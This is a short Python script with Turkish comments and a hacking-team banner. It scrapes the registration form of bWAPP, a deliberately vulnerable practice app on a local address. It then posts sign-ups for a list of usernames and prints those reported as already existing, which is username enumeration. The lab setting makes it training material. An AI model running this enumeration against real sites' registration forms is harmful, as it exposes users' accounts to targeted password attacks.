import requests
from bs4 import BeautifulSoup
from termcolor import colored
import os 
import time
import threading

mesaj = '''
[+]---TURK-----HACK-----TEAM----[+]
[+]-----------yuathay-----------[+]
[+]-----------------------------[+]
'''

register = "http://192.168.1.39/bWAPP/user_new.php"
response = requests.get(register).text
düzelt = BeautifulSoup(response,'html.parser').find_all("input")
düzelt = str(düzelt).split()

sözlük = {}
for i in düzelt:
    if i.startswith("name"):
        i = i.replace('name="','').replace('"','')
        sözlük[i] = ""

usernames = ["bee","ali","alice","vatan","derya","deniz"] #deneyeceğimiz usernames'ler

#--------------
#bu kısım değişmeyecek değerler olacak password action gibi verileri döngüye almamıza gerek yok
sözlük["password"] = "bug"
sözlük["password_conf"] = "bug"
sözlük["secret"] = "rastgele"
sözlük["action"] = "create"
#--------------

if os.name == 'nt': #sistem windows ise cls ile ekranı temizliyoruz
    os.system("cls")
else: #değilse clear ile temizliyoruz
    os.system("clear")
    
print(mesaj)
print("mevcut kullanıcılar :\n")
def user():
    for i in range(len(usernames)):
        
        sözlük['login'] = usernames[i] #kullanıcı adları tek tek denenecek
        sözlük['email'] = f"kullanici{i}@gmail.com" #aynı gmail ile kayıt işlemi yaparsak kullanıcı mevcut diyebilir o yüzden email'ide her döngüde değiştiriyoruz
        
        mesaj = requests.post(register,data=sözlük).text #değerleri gonderdik
        time.sleep(0.50)
        if "The login or e-mail already exists!" in mesaj: # kullanıcı sitede mevcut ise kullanıcı adını yazıyoruz
            print(colored(f"[+] {usernames[i]}","blue"))
    
t = threading.Thread(target=user) #bu şekilde kod daha hızlı çalışacak
t.start() #fonksiyonu başlatıyoruz
